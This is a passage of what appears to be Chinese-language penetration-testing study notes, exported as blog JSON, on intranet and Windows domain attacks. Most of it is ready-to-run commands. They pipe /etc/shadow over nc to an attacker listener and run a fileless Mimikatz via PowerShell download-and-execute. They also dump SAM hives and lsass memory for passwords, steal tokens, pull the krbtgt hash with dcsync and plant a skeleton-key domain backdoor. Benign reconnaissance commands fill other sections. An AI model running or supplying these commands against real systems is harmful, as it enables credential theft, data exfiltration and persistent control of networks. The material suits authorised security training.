class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 域sid</span><br><span class=\"line\">2. 域名</span><br><span class=\"line\">3. 用户名:可以是任意用户名</span><br><span class=\"line\">4. 服务名</span><br><span class=\"line\">5. 目标计算机账户密码hash</span><br><span class=\"line\"></span><br><span class=\"line\">kerberos::golden命令导出白银票据</span><br></pre></td></tr></table></figure>\n\n<p>获取krbtgt凭证</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync /dc:School-DM.school.com /domain:school.com /user:krbtgt</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Skeleton-key\"><a href=\"#Skeleton-key\" class=\"headerlink\" title=\"Skeleton key\"></a>Skeleton key</h4><p>域后门</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">misc::skeleton</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">万能密码为mimikatz,操作要在域控上完成,且域控重启后失效.(鸡肋)</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"内网渗透-笔记\"><a href=\"#内网渗透-笔记\" class=\"headerlink\" title=\"内网渗透-笔记\"></a>内网渗透-笔记</h1><h2 id=\"内网概念\"><a href=\"#内网概念\" class=\"headerlink\" title=\"内网概念\"></a>内网概念</h2><p>●内部工作人员才能访问的专用网络</p>\n<p>●能够获得的信息和服务是公众无法从互联网获取的</p>\n<p>●常见用局域网(LAN)和广域网(WAN)来建立内网</p>\n<h2 id=\"进行内网渗透的情况\"><a href=\"#进行内网渗透的情况\" class=\"headerlink\" title=\"进行内网渗透的情况\"></a>进行内网渗透的情况</h2><p>●突破外网进入内网</p>\n<p>●仅面向内网系统系统的渗透测试</p>\n<p>●模拟内部员工进行渗透测试</p>\n<h2 id=\"内网渗透基本流程\"><a href=\"#内网渗透基本流程\" class=\"headerlink\" title=\"内网渗透基本流程\"></a>内网渗透基本流程</h2><ol>\n<li><p>信息收集</p>\n</li>\n<li><p>获取权限</p>\n</li>\n<li><p>横向移动</p>\n</li>\n<li><p>权限维持</p>\n</li>\n<li><p>清理痕迹</p>\n</li>\n</ol>\n<h2 id=\"域渗透流程\"><a href=\"#域渗透流程\" class=\"headerlink\" title=\"域渗透流程\"></a>域渗透流程</h2><ol>\n<li>普通域内用户密码</li>\n<li>登录到目标域中</li>\n<li>域管进程</li>\n<li>抓取域管密码</li>\n<li>定位域控</li>\n<li>登录域控导出域内所有hash留存备份</li>\n<li>域控制维持</li>\n<li>后渗透</li>\n</ol>\n<h2 id=\"文件传输方法\"><a href=\"#文件传输方法\" class=\"headerlink\" title=\"文件传输方法\"></a>文件传输方法</h2><h3 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3><h4 id=\"FTP\"><a href=\"#FTP\" class=\"headerlink\" title=\"FTP\"></a>FTP</h4><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ftp -s:<span class=\"number\">1</span><span class=\"selector-class\">.txt</span>                        <span class=\"comment\">//以1.txt中的内容执行ftp命令</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"VBS\"><a href=\"#VBS\" class=\"headerlink\" title=\"VBS\"></a>VBS</h4><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 下载文件程序 &gt;&gt; loader.vbs</span><br><span class=\"line\">cscript loader<span class=\"selector-class\">.vbs</span> 远程文件位置 保存文件位置</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"powershell\"><a href=\"#powershell\" class=\"headerlink\" title=\"powershell\"></a>powershell</h4><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell -exec bypass -c (new-<span class=\"selector-tag\">object</span> System<span class=\"selector-class\">.Net</span><span class=\"selector-class\">.WebClient</span>).DownloadFile(<span class=\"string\">'远程文件位置'</span>,<span class=\"string\">'保存文件位置'</span>)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"certutil\"><a href=\"#certutil\" class=\"headerlink\" title=\"certutil\"></a>certutil</h4><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">certutil.<span class=\"keyword\">exe</span> -urlcache -<span class=\"keyword\">split</span> -<span class=\"keyword\">f</span> 远程文件位置</span><br><span class=\"line\">certutil.<span class=\"keyword\">exe</span> -urlcache -<span class=\"keyword\">split</span> -<span class=\"keyword\">f</span> 远程文件位置 <span class=\"keyword\">delete</span> 删除缓存</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h3><h4 id=\"wget和wput\"><a href=\"#wget和wput\" class=\"headerlink\" title=\"wget和wput\"></a>wget和wput</h4><h4 id=\"nc\"><a href=\"#nc\" class=\"headerlink\" title=\"nc\"></a>nc</h4><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">攻击端监听端口，并重定向：</span><br><span class=\"line\">nc -nvv -lp <span class=\"number\">4455</span> &gt; shaodw.txt</span><br><span class=\"line\">目标机将文件内容回传：</span><br><span class=\"line\">nc <span class=\"number\">192.168</span><span class=\"number\">.111</span><span class=\"number\">.251</span> <span class=\"number\">4455</span> &lt; /etc/shadow</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"curl\"><a href=\"#curl\" class=\"headerlink\" title=\"curl\"></a>curl</h4><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -O http://<span class=\"number\">192.168</span><span class=\"meta\">.111</span><span class=\"meta\">.1</span>:<span class=\"number\">8080</span>/<span class=\"keyword\">test</span>/putty.exe</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"scp\"><a href=\"#scp\" class=\"headerlink\" title=\"scp\"></a>scp</h4><h4 id=\"Rsync\"><a href=\"#Rsync\" class=\"headerlink\" title=\"Rsync\"></a>Rsync</h4><h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><h4 id=\"python快速搭建服务器\"><a href=\"#python快速搭建服务器\" class=\"headerlink\" title=\"python快速搭建服务器\"></a>python快速搭建服务器</h4><table>\n<thead>\n<tr>\n<th align=\"center\">类型</th>\n<th align=\"center\">命令</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">http</td>\n<td align=\"center\">python -m SimpleHTTPServer 80</td>\n</tr>\n<tr>\n<td align=\"center\">ftp</td>\n<td align=\"center\">python -m pyftpdlib -p 21 (需要安装,默认用户anonymous)</td>\n</tr>\n</tbody></table>\n<h4 id=\"防火墙对ftp两种模式的影响-尤其是Windows自带的ftp\"><a href=\"#防火墙对ftp两种模式的影响-尤其是Windows自带的ftp\" class=\"headerlink\" title=\"防火墙对ftp两种模式的影响(尤其是Windows自带的ftp)\"></a>防火墙对ftp两种模式的影响(尤其是Windows自带的ftp)</h4><h4 id=\"powershell搭建http\"><a href=\"#powershell搭建http\" class=\"headerlink\" title=\"powershell搭建http\"></a>powershell搭建http</h4><p><a href=\"https://gallery.technet.microsoft.com/scriptcenter/Powershell-Webserver-74dcf466/file/162511/2/Start-WebServer.ps1\" target=\"_blank\" rel=\"noopener\">https://gallery.technet.microsoft.com/scriptcenter/Powershell-Webserver-74dcf466/file/162511/2/Start-WebServer.ps1</a></p>\n<h2 id=\"Windows信息收集\"><a href=\"#Windows信息收集\" class=\"headerlink\" title=\"Windows信息收集\"></a>Windows信息收集</h2><h3 id=\"系统信息\"><a href=\"#系统信息\" class=\"headerlink\" title=\"系统信息\"></a>系统信息</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systeminfo</span><br><span class=\"line\"><span class=\"comment\">#csv格式</span></span><br><span class=\"line\">systeminfo /fo:csv</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"用户及用户组信息\"><a href=\"#用户及用户组信息\" class=\"headerlink\" title=\"用户及用户组信息\"></a>用户及用户组信息</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查看当前用户及sid</span></span><br><span class=\"line\">whoami /user</span><br><span class=\"line\"><span class=\"comment\">#查看用户组</span></span><br><span class=\"line\">whoami /proups</span><br><span class=\"line\"><span class=\"comment\">#查看用户权限</span></span><br><span class=\"line\">whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看用户</span></span><br><span class=\"line\">net user</span><br><span class=\"line\"><span class=\"comment\">#查看admin用户详细信息</span></span><br><span class=\"line\">net user <span class=\"string\">\"admin\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看组</span></span><br><span class=\"line\">net localgroup</span><br><span class=\"line\"><span class=\"comment\">#查看administrators组</span></span><br><span class=\"line\">net localgroup <span class=\"string\">\"administrators\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看密码策略</span></span><br><span class=\"line\">net accounts</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"登录信息\"><a href=\"#登录信息\" class=\"headerlink\" title=\"登录信息\"></a>登录信息</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">query user</span><br><span class=\"line\"><span class=\"comment\">#查看在线用户，登陆时间，登录类型</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网络信息\"><a href=\"#网络信息\" class=\"headerlink\" title=\"网络信息\"></a>网络信息</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipconfig</span><br><span class=\"line\">ipconfig /all</span><br><span class=\"line\">ipconfig /displaydns</span><br><span class=\"line\"></span><br><span class=\"line\">route</span><br><span class=\"line\"><span class=\"comment\">#查看路由信息</span></span><br><span class=\"line\">route print -<span class=\"number\">4</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#显示arp缓存</span></span><br><span class=\"line\">arp -a</span><br><span class=\"line\"></span><br><span class=\"line\">netstat</span><br><span class=\"line\"><span class=\"comment\">#显示活动的tcp,udp及对应pid</span></span><br><span class=\"line\">netstat -ano</span><br><span class=\"line\"><span class=\"comment\">#显示tcp连接</span></span><br><span class=\"line\">netstat -p tcp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看共享信息</span></span><br><span class=\"line\">net share </span><br><span class=\"line\"><span class=\"comment\">#查看c$共享信息</span></span><br><span class=\"line\">net share c$</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#检索网络连接列表</span></span><br><span class=\"line\">net use</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"敏感文件\"><a href=\"#敏感文件\" class=\"headerlink\" title=\"敏感文件\"></a>敏感文件</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.cmdkey /list</span><br><span class=\"line\"><span class=\"number\">2</span>.Hosts文件 （C:\\Windows\\System32\\drivers\\etc\\hosts）</span><br><span class=\"line\"><span class=\"number\">3</span>.回收站(cmd)</span><br><span class=\"line\">cd C:\\<span class=\"variable\">$RECYCLE</span>.BIN</span><br><span class=\"line\"><span class=\"comment\">#dir /ah （查看文件夹，包括隐藏文件）</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"IIS信息收集\"><a href=\"#IIS信息收集\" class=\"headerlink\" title=\"IIS信息收集\"></a>IIS信息收集</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IIS6 - adminscripts</span><br><span class=\"line\">IIS7之后 - appcmd</span><br><span class=\"line\">路径：%systemroot%\\system32\\inetsrv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#有权限条件下可执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#列出网站列表</span></span><br><span class=\"line\">%systemroot%/system32/inetsrv/appcmd.exe list site</span><br><span class=\"line\"><span class=\"comment\">#列出物理路径</span></span><br><span class=\"line\">%systemroot%/system32/inetsrv/appcmd.exe list vdir</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"凭证收集\"><a href=\"#凭证收集\" class=\"headerlink\" title=\"凭证收集\"></a>凭证收集</h3><p>思路：Windows hash、浏览器密码、cookie、远程桌面密码、VPN密码、WLAN密码、IIS服务器密码、FTP服务器密码等。</p>\n<h4 id=\"Windows-Hash\"><a href=\"#Windows-Hash\" class=\"headerlink\" title=\"Windows Hash\"></a>Windows Hash</h4><p>NTLM hash 和 LM Hash</p>\n<p>hash在内存中可被抓取</p>\n<h4 id=\"离线凭证收集\"><a href=\"#离线凭证收集\" class=\"headerlink\" title=\"离线凭证收集\"></a>离线凭证收集</h4><h5 id=\"reg命令保存注册表键\"><a href=\"#reg命令保存注册表键\" class=\"headerlink\" title=\"reg命令保存注册表键\"></a>reg命令保存注册表键</h5><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#注意UAC</span></span><br><span class=\"line\">reg save hklm\\sam c:\\sam.hive</span><br><span class=\"line\">reg save hklm\\system c:\\system.hive</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"使用Invoke-NinjaCopy\"><a href=\"#使用Invoke-NinjaCopy\" class=\"headerlink\" title=\"使用Invoke-NinjaCopy\"></a>使用Invoke-NinjaCopy</h5><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell -exec bypass</span><br><span class=\"line\"><span class=\"built_in\">Import-Module</span> .\\invoke-ninjacopy.ps1</span><br><span class=\"line\"><span class=\"comment\"># -Path SAM/SYSTEM了路径  -LocalDestination 保存位置</span></span><br><span class=\"line\">Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestination c：\\sam.hive </span><br><span class=\"line\">Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SYSTEM -LocalDestination c：\\system.hive</span><br></pre></td></tr></table></figure>\n\n<p>利用上述手段将两个文件保存到本地，再用saminside或cain导入</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#### Saminside</span></span><br><span class=\"line\"></span><br><span class=\"line\">exe程序，需要拿到sam和system文件</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#### Cain</span></span><br><span class=\"line\"></span><br><span class=\"line\">类似Saminside。</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h5 id=\"离线提取lsass进程\"><a href=\"#离线提取lsass进程\" class=\"headerlink\" title=\"离线提取lsass进程\"></a>离线提取lsass进程</h5><p>任务管理器找到lsass进程后右键转储文件。（不同版本Windows进程名可能不同）</p>\n<h5 id=\"procdump-exe\"><a href=\"#procdump-exe\" class=\"headerlink\" title=\"procdump.exe\"></a>procdump.exe</h5><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#cmd下</span></span><br><span class=\"line\">procdump.exe -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>\n\n<p>再用mimikatz提取密码(管理员)  （有Powershell版Mimikatz）</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::minidump lsass.dmp </span><br><span class=\"line\">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"在线凭证收集\"><a href=\"#在线凭证收集\" class=\"headerlink\" title=\"在线凭证收集\"></a>在线凭证收集</h4><h5 id=\"Mimikatz\"><a href=\"#Mimikatz\" class=\"headerlink\" title=\"Mimikatz\"></a>Mimikatz</h5><p><a href=\"https://github.com/gentilkiwi/mimikatz\" target=\"_blank\" rel=\"noopener\">https://github.com/gentilkiwi/mimikatz</a></p>\n<h5 id=\"Powershell版Mimikatz\"><a href=\"#Powershell版Mimikatz\" class=\"headerlink\" title=\"Powershell版Mimikatz\"></a>Powershell版Mimikatz</h5><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Powershell版</span></span><br><span class=\"line\"><span class=\"comment\">#写好的Powershell文件</span></span><br><span class=\"line\">powershell <span class=\"built_in\">Import-Module</span> .\\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command <span class=\"string\">'\"privilege::debug\" \"sekurlsa::logonPasswords full\"'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#无文件执行</span></span><br><span class=\"line\">powershell Iex (<span class=\"built_in\">new-object</span> net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command <span class=\"string\">'\"privilege::debug\" \"sekurlsa::logonPasswords full\"'</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Windows访问令牌\"><a href=\"#Windows访问令牌\" class=\"headerlink\" title=\"Windows访问令牌\"></a>Windows访问令牌</h3><p>系统使用令牌来控制用户可访问的对象，并控制用户执行相关系统操作。</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#两种<span class=\"keyword\">token</span></span><br><span class=\"line\">·Delegation <span class=\"keyword\">token</span>（授权令牌]：用于交互会话登录（例如本地用户直接登录、远程</span><br><span class=\"line\">桌面登录）</span><br><span class=\"line\">·Impersonation <span class=\"keyword\">token</span>（模拟令牌]：用于非交互登录（利用<span class=\"keyword\">net</span> <span class=\"keyword\">use</span>访问共享文件夹）</span><br></pre></td></tr></table></figure>\n\n<p>注：</p>\n<p>两种token只在系统重启后清除</p>\n<p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p>\n<h4 id=\"令牌窃取\"><a href=\"#令牌窃取\" class=\"headerlink\" title=\"令牌窃取\"></a>令牌窃取</h4><h5 id=\"mimikatz\"><a href=\"#mimikatz\" class=\"headerlink\" title=\"mimikatz\"></a>mimikatz</h5><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#管理员运行mimikatz</span></span><br><span class=\"line\"><span class=\"comment\">#获取debug权限</span></span><br><span class=\"line\">privilege::debug</span><br><span class=\"line\"><span class=\"comment\">#模仿system用户的令牌</span></span><br><span class=\"line\">token::elevate</span><br><span class=\"line\"><span class=\"comment\">#列出令牌</span></span><br><span class=\"line\">token::list</span><br><span class=\"line\"><span class=\"comment\">#获取sam数据库中的密码</span></span><br><span class=\"line\">lsadump::sam</span><br><span class=\"line\"><span class=\"comment\">#恢复令牌</span></span><br><span class=\"line\">token::revert</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Invoke-TokenManipulation-ps1\"><a href=\"#Invoke-TokenManipulation-ps1\" class=\"headerlink\" title=\"Invoke-TokenManipulation.ps1\"></a>Invoke-TokenManipulation.ps1</h5><p> <a href=\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1\" target=\"_blank\" rel=\"noopener\">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p>\n<h5 id=\"meterpreter中incognito\"><a href=\"#meterpreter中incognito\" class=\"headerlink\" title=\"meterpreter中incognito\"></a>meterpreter中incognito</h5><h2 id=\"Linux下信息收集\"><a href=\"#Linux下信息收集\" class=\"headerlink\" title=\"Linux下信息收集\"></a>Linux下信息收集</h2><h3 id=\"查看系统类型\"><a href=\"#查看系统类型\" class=\"headerlink\" title=\"查看系统类型\"></a>查看系统类型</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/issue</span><br><span class=\"line\">cat /etc/*-release</span><br><span class=\"line\">cat /etc/lsb-release</span><br><span class=\"line\">cat /etc/redhat-release (红帽子)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"内核版本\"><a href=\"#内核版本\" class=\"headerlink\" title=\"内核版本\"></a>内核版本</h3><figure class=\"highlight tcl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /<span class=\"keyword\">proc</span>/version</span><br><span class=\"line\">uname -a</span><br><span class=\"line\">uname -mrs</span><br><span class=\"line\">rpm -q<span class=\"title\"> kernel</span></span><br><span class=\"line\"><span class=\"title\">dmesg</span> |<span class=\"title\"> grep</span> linux</span><br><span class=\"line\">ls /boot |<span class=\"title\"> grep</span> vmlinux</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"进程与服务\"><a href=\"#进程与服务\" class=\"headerlink\" title=\"进程与服务\"></a>进程与服务</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ps</span> aux</span><br><span class=\"line\"><span class=\"keyword\">ps</span> -ef</span><br><span class=\"line\">top</span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/services</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装的应用程序\"><a href=\"#安装的应用程序\" class=\"headerlink\" title=\"安装的应用程序\"></a>安装的应用程序</h3><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">dpkg -l</span></span><br><span class=\"line\"><span class=\"attribute\">rpm -qa</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"基本信息收集\"><a href=\"#基本信息收集\" class=\"headerlink\" title=\"基本信息收集\"></a>基本信息收集</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cat</span> /etc/syslog.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/chttp.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/lighttpd.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/cups/cupsd.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/inetd.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/apache2/apache2.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/my.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/httpd/<span class=\"keyword\">conf</span>/httpd.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /<span class=\"keyword\">opt</span>/lampp/etc/httpd.<span class=\"keyword\">conf</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"计划任务\"><a href=\"#计划任务\" class=\"headerlink\" title=\"计划任务\"></a>计划任务</h3><figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab -l</span><br><span class=\"line\"><span class=\"number\">1</span>s -alh <span class=\"meta-keyword\">/var/</span>spool/cron</span><br><span class=\"line\"><span class=\"number\">1</span>s -al <span class=\"meta-keyword\">/etc/</span> | grep cron</span><br><span class=\"line\"><span class=\"number\">1</span>s -al <span class=\"meta-keyword\">/etc/</span>cron*</span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>cron*</span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>at.allow </span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>at.deny</span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>cron.allow </span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>cron.deny </span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>crontab </span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>anacrontab </span><br><span class=\"line\">cat <span class=\"meta-keyword\">/var/</span>spool<span class=\"meta-keyword\">/cron/</span>crontabs/root</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网络配置\"><a href=\"#网络配置\" class=\"headerlink\" title=\"网络配置\"></a>网络配置</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/network/interfaces </span><br><span class=\"line\">cat /etc/sysconfig<span class=\"built_in\">/network </span></span><br><span class=\"line\">cat /etc/resolv.conf </span><br><span class=\"line\">cat 